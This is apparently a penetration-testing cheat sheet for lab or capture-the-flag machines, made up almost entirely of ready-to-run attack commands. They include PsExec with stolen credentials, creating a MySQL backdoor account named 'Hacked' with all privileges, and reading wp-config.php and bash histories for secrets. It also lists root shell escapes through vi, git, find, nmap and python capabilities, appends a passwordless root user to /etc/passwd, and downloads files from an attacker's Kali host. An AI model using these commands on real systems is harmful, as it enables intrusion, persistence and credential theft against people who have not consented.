# General Command Reference

## Impacket
- **PsExec (with credentials):**
  ```bash
  impacket-psexec [DOMAIN]/[USER]:[PASSWORD]@[IP]
  ```

## SQL (MySQL)
- **Login:** `mysql -u root`
- **Create Hacked User:**
  ```sql
  CREATE DATABASE schlix_db;
  CREATE USER 'Hacked'@'%' IDENTIFIED BY 'Hacked';
  GRANT ALL PRIVILEGES ON *.* TO 'Hacked'@'%';
  FLUSH PRIVILEGES;
  ```

## Shell Stabilization
- **Python PTY:**
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

## Enumeration / Information Gathering
- **Sudo capabilities:** `sudo -l`
- **SUID Binaries:** `find / -perm -4000 -type f 2>/dev/null | grep -v proc`
- **Config Files (e.g., WordPress):** `cat /var/www/html/wordpress/wp-config.php`
- **Bash History:** `cat /home/*/.bash_history`

## Privilege Escalation Techniques

### vi
- **Escape to shell:**
  ```text
  :set shell=/bin/bash
  :shell
  ```

### /usr/bin/teehee
- **Append root user to /etc/passwd:**
  ```bash
  echo "toor::0:0:root:/root:/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd
  ```

### .git (sudo git help)
- **Escape to shell:**
  ```bash
  sudo git help config
  !/bin/bash
  ```

### find (SUID/Sudo)
- **Execute shell:**
  ```bash
  find . -exec /bin/sh \; -quit
  ```

### nmap (Sudo)
- **Execute via NSE script:**
  ```bash
  cat > /tmp/root.nse << 'EOF'
  local os = require "os"
  prerule = function() return true end
  action = function() os.execute("/bin/bash") end
  EOF
  sudo nmap --script=/tmp/root.nse 127.0.0.1
  ```

### Python Capabilities (cap_setuid)
- **Set UID and spawn shell:**
  ```bash
  /usr/bin/python2.7 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
  ```

## File Transfer
- **Kali side:** `python3 -m http.server 8000`
- **Target side:** `wget http://[KALI_IP]:8000/file`
- **Compilation:** `gcc exploit.c -o exploit`
